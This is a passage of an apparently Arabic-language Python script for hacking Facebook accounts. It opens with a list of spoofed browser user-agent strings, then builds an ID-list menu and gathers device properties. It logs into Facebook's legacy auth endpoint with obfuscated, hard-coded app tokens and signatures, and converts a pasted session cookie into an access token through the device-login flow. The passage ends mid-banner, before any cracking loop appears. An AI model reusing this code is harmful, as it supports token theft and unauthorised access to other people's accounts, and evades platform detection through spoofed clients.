  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3)",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0)",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315)",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;])",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2))",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS))",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko)",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR))",
  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt))",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E))",
  "DoCoMo/2.0 P903i(c100;TB;W24H12))",
  "DoCoMo/2.0 P903i)",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12))",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14))",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320))",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960)",
  "Mogujie4Android/NAMhuawei/1290)",
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import webbrowser
webbrowser.open('')
from datetime import *
import requests
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;153m'  # أخضر فاتح
print(SDMVIP) 
print('')
print('\x1b[38;5;153m━━'*30)
print('\x1b[38;5;153m━━'*30)
print('\x1b[1;38m[1]  - صـنـع مــلــف ايـديـات')
print(a3+'=='*30)
print('\x1b[1;38m[2]  - تشـغـيل اداة صـيد من ملـف')
print('\x1b[38;5;153m━━'*30)
print('\x1b[38;5;153m━━'*30)
print('')
M_T_F=input('  𝖤𝗇𝗍𝖾𝗋 : ')
if M_T_F== '1':
    a1 = '\x1b[1;31m'  # أحمر
    a2 = '\x1b[1;34m'  # أزرق
    a3 = '\x1b[1;32m'  # أخضر
    a4 = '\x1b[1;33m'  # أصفر
    a5 = '\x1b[38;5;208m'  # برتقالي
    a6 = '\x1b[38;5;5m'  # أرجواني
    a7 = '\x1b[38;5;13m'  # وردي
    a8 = '\x1b[1;30m'  # أسود
    a9 = '\x1b[1;37m'  # أبيض
    a10 = '\x1b[38;5;52m'  # بني
    a11 = '\x1b[38;5;8m'  # رمادي
    a12 = '\x1b[38;5;220m'  # ذهبي
    a13 = '\x1b[38;5;7m'  # فضي
    a14 = '\x1b[38;5;153m'  # أزرق فاتح
    a15 = '\x1b[38;5;18m'  # أزرق داكن
    a16 = '\x1b[38;5;153m'  # أخضر فاتح
    a17 = '\x1b[38;5;22m'  # أخضر داكن
    a18 = '\x1b[38;5;196m'  # أحمر فاتح
    a19 = '\x1b[38;5;88m'  # أحمر داكن
    a20 = '\x1b[38;5;226m'  # أصفر فاتح
    a21 = '\x1b[38;5;136m'  # أصفر داكن
    a22 = '\x1b[38;5;216m'  # برتقالي فات
    a23 = '\x1b[38;5;166m'  # برتقالي داكن
    a24 = '\x1b[38;5;234m'  # أرجواني فاتح
    a25 = '\x1b[38;5;91m'  # أرجواني داكن
    a26 = '\x1b[38;5;205m'  # وردي فاتح
    a27 = '\x1b[38;5;161m'  # وردي داكن
    a28 = '\x1b[38;5;236m'  # أسود فاتح
    a29 = '\x1b[38;5;233m'  # أسود داكن
    a30 = '\x1b[38;5;255m'  # أبيض فاتح
    a31 = '\x1b[38;5;231m'  # أبيض داكن
    a32 = '\x1b[38;5;180m'  # بني فاتح
    a33 = '\x1b[38;5;94m'  # بني داكن
    a34 = '\x1b[38;5;252m'  # رمادي فاتح
    a35 = '\x1b[38;5;246m'  # رمادي داكن
    a36 = '\x1b[38;5;228m'  # ذهبي فاتح
    a37 = '\x1b[38;5;172m'  # ذهبي داكن
    a38 = '\x1b[38;5;188m'  # فضي فاتح
    a39 = '\x1b[38;5;247m'  # فضي داكن
    a40 = '\x1b[38;5;117m'  # أزرق سماوي8
    import os, re, random, uuid, subprocess, requests, sys, time, json, string
    from os import system
    libraries_to_install = ['random', 'uuid', 'subprocess', 'requests', 'time', 'json', 'string']
    [exec(f"import {lib}") if lib not in sys.modules else None for lib in libraries_to_install]
    try:
    	import mechanize
    	demo_folder = mechanize.Browser()
    	demo_folder.set_handle_robots(False)
    	demo_folder.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except:
    	os.system('pip install mechanize')
     
    def M_T_F(u):
    	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
    def back():
        main_menu()
    def linex():
    	ge0=0
    G = "\u001b[32m"
    B = "\u001b[36m"
    W = "\033[1;37m"
    pemisah = '|'
    q="968"
    qq="8280"
    qqq="52729"
    qqqq="420"
    client_id = f"{qqqq}038{q}89{qq}485649{qqq}208"
    sim_hini = str(random.randint(2e4,4e4))
    trace_id = str(uuid.uuid4())
    try:
    	android = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '').upper()
    	model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '').upper()
    	carrier = '' + subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '').upper()
    except:
    	android = random.choice(['TECNO', "INFINIX", "SAMSUNG"])
    	model = random.choice(['LD2', "SM-J009", "SM-J505", "HOT12", "NOTE-11", "A5-PRO"])
    	carrier = '' + random.choice(['02', 'Oramge', 'EE', "At&", "MTN", "Cricket"])
    P = '\x1b[1;97m'
    M = '\x1b[1;91m'
    H = '\x1b[1;92m'
    K = '\x1b[1;93m'
    B = '\x1b[1;94m'
    U = '\x1b[1;95m' 
    O = '\x1b[1;96m'
    N = '\x1b[0m'    
    Z = "\033[1;30m" 
    def find_txt_file(file_path):
        user_dir, user_file = os.path.split(file_path)
    
        if os.path.exists(file_path) and file_path.lower().endswith('.txt'):
            return file_path
        parent_dir = os.path.dirname(user_dir)
        for root, dirs, files in os.walk(parent_dir):
            for name in files:
                if name.lower() == user_file.lower() and name.lower().endswith('.txt'):
                    corrected_path = os.path.join(root, name)
                    return corrected_path
    
        return None
	
    class login():    	
    
    	def __init__(self):
    		ids=[]
    	def lo_epa(self):
    		system('clear')
    		print(a1+'''\033[1;34m
\x1b[38;5;180m \x1b[38;5;180m 
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠁⠉⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⠙⠻⢿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢰⡄⠀⠀⠀⢳⡄⣿⣶⣄⠀⢿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣦⠀⠀⢸⣿⣿⣿⣿⣷⣸⣿⣿⣿⡇
⠠⢤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⣿⣿⣷⡀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠈⠙⠻⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠿⠿⠿⠿⠿⠿⠟⠛⠻⣿⡀⠀⠀⠀⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠈⠀⠀⢀⣀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⢀⣤⣾⣿⠟⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣀⣀⡀⠀⠀⣀⠀⠀⠀⢸⣧⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⣠⡶⠿⠟⠛⠁⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⣶⡿⣀⣀⡉⠓⠞⠁⠀⠀⠀⢸⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢸⣿⡏⣴⠁⢀⠉⢢⠀⠀⠀⠀⠀⢸⣿⠀⠀⡎⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣶⠸⣿⣇⠻⣀⡼⠀⢸⠀⠀⠀⠀⠀⢸⣿⠀⢠⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠸⢿⣧⠙⢿⣿⠁⠀⣠⡞⠀⠀⠀⠀⠀⢸⣿⢀⡎⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⢰⣶⣦⡀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⠘⠋⠉⠀⠀⠀⠀⠀⠀⢸⣿⣾⢁⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀⣿⣿⣿⣷⣶⣦⣤⣉⠉⠩⣍⣉⣙⣛⡛⠛⠛⠛⠛⣀⣤⣤⣤⣤⣴⣶⣶⡶⣾⡿⠛⠛⠛⠉⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢰⣿⣿⣿⡿⠿⠟⠛⠛⠳⠦⢌⠻⢿⣿⣿⣿⣿⣿⠀⠀⠉⠉⢀⠴⠚⠉⠀⠀⣼⠁⢀⣀⣤⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⢼⣿⣿⣿⣿⣿⣿⣿⣿⣔⣾⣿⠁⢠⡄⠐⣮⣴⣭⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣤⣬⣥⣬⣽⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣠⣤⣤⣤⣤⣤⣤⣤⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠈⢻⣿⣿⣿⣿⡟⠁⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡿⣿⠿⣛⣭⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠙⠿⠿⠋⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠇⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⡿⣻⣿⣿⡿⠛⠛⠛⠛⠛⠛⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⢟⣽⣿⣿⣿⣿⣷⣶⣿⡿⠿⠿⠿⠷⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠺⢿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣄⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⣠⣴⡿⠟⠁⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣤⡈⠛⠿⣿⣿⣿⣿⠟⣋⣠⣤⣶⡿⠟⠋⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣷⣶⣤⣤⣤⣤⣤⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠇
''')
    		print(f'\x1b[1;37m سـجل بـحساب فـايسبوك وهـمي')
    		print(f"{a40}—"*60)
    		em = str(input(f"[√] - Enter Gmail / Id :"))
    		linex()
    		print(f'{a40}—'*60)
    		linex()
    		ps = input(f'[√] - Enter Password :')
    		print(f'{a40}—'*60)    
    		print('')    
    		linex()
    		e="5990"
    		ee="655"
    		eee="59"
    		tok1 = f"2377{e}9{eee}1{ee}"
    		ei="0f140aabedfb65"
    		ei2="a2263b1"
    		tok2 = f"25257C{ei}ac27a739ed1{ei2}"
    		us = f'Mozilla/5.0 (Linux; Android {str(random.randint(4,11))}.0; Nexus 5 Build/MRA{str(random.randint(30,60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600,1661))}.41'
    		demo_folder.addheaders = [('User-Agent', us)]
    		li = "b-ap"
    		lo = "od/auth.l"
    		op="3f555f98"
    		op2 = "d7aa0c"
    		op3="58f522efm"
    		sig=f"{op}fb61fc{op2}44f{op3}"
    		p = demo_folder.open(
    			'https://'+li+'i.facebook.com/meth'+lo+'ogin?access_token='+tok1+'%'+tok2+'&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + ps + '&sdk=ios&generate_session_cookies=1&sig='+sig+'')
    		po = json.load(p)
    		if 'access_token' in po:
    			toke=po['access_token']
    			linex()
    			print(f"{a40}—"*60)
    			M_T_F(f'\033[1;32m[\033[1;37m√\033[1;32m] - Login Done - Restart The Tool')
    			linex()
    			open('.token.txt','w').write(toke)
    			exit()
    		else:
    			if 'www.facebook.com' in po['error_msg']:
    				print('WAIT......')
    				exit(em+'|'+ps)
    			else:
    				linex()
    				exit(f'{a1} Werong Information ❌ ')
    	def login_epa2(self):
    		system('clear');
    		print(logo)
    		cooke = input(' cookie : ')
    		cookie = {'Cookie': cooke}
    		xyz = requests.session()
    		data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
    		req = xyz.post('https://graph.facebook.com/v16.0/device/login/', data=data).json()
    		cd = req['code']
    		ucd = req['user_code']
    		url = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038' % (
    			cd)
    		req = bs(xyz.get('https://mbasic.facebook.com/device', cookies=cookie).content, 'html.parser')
    		raq = req.find('form', {'method': 'post'})
    		dat = {'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),
    			   'fb_dtsg': re.search('name="fb_dtsg" type="hidden" value="(.*?)"', str(req)).group(1), 'qr': '0',
    			   'user_code': ucd}
    		rel = 'https://mbasic.facebook.com' + raq['action']
    		pos = bs(xyz.post(rel, data=dat, cookies=cookie).content, 'html.parser')
    		dat = {}
    		raq = pos.find('form', {'method': 'post'})
    		for x in raq('input', {'value': True}):
    			try:
    				if x['name'] == '__CANCEL__':
    					pass
    				else:
    					dat.update({x['name']: x['value']})
    			except Exception as e:
    				pass
    		rel = 'https://mbasic.facebook.com' + raq['action']
    		pos = bs(xyz.post(rel, data=dat, cookies=cookie).content, 'html.parser')
    		req = xyz.get(url, cookies=cookie).json()
    		if 'access_token' in req:
    			print(f' [{B}•{W}] LOGIN DONE RERUN ')
    			open('.token.txt', 'w').write(req['access_token'])
    			exit()
    		else:
    			exit('WRONG')
    	def login_WALA(self):
    		system('clear')
    		
    		
    		linex()
    		menu =('1')
    		if menu in ['01', '1', 'A', 'a']:
    			login().lo_epa()
    		if menu in ['461918']:
    			login().login_epa2()
    		
    		else:
    			linex()
    			M_T_F('YOUR CHOSE IS WRONG')
    			time.sleep(1)
    			login_WALA()
    
    def main_menu():
    	os.system("clear")
    	print("")
    	print(a1+'''\033[1;34m
\x1b[38;5;180m \x1b[38;5;180m 

 ⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀          ⠀⠀⠀
⠀⠀⠀⠀⣠⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⡀⠀
⠀⠀⢀⣾⡟⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡙⣿⡄
⠀⠀⣸⣿⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣹⣿
⠀⠀⣿⣿⡆⢚⢄⣀⣠⠤⠒⠈⠁⠀⠀⠈⠉⠐⠢⢄⡀⣀⢞⠀⣾⣿
⠀⠀⠸⣿⣿⣅⠄⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠑⣄⣽⣿⡟
⠀⠀⠀⠘⢿⣿⣟⡾              ⠱⣾⣿⣿⠏⠀
⠀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⢻⠀          ⠀
⠀⠀⠀⠀⢿⠀⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⢸         ⠀⠀
⠀⠀⠀⠀⢸⢰⡿⢘⣦⣤⣀⠑⢦⡀⠀⣠⠖⣁⣤⣴⡊⢸⡇⡼          ⠀⠀
⠀⠀⠀⠀⠀⠾⡅⣿⣿⣿⣿⣿⠌⠁⠀⠁⢺⣿⣿⣿⣿⠆⣇⠃          ⠀⠀
⠀⠀⠀⠀⠀⢀⠂⠘⢿⣿⣿⡿⠀⣰⣦⠀⠸⣿⣿⡿⠋⠈⢀          ⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⢠⣿⢻⣆⠀⠀⠀⠀⠀⠀⣸          ⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠓⠶⣶⣦⠤⠀⠘⠋⠘⠋⠀⠠⣴⣶⡶⠞⠃          ⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⢹⣷⠦⢀⠤⡤⡆⡤⣶⣿⢸⠇          ⠀⠀⠀⠀⠀
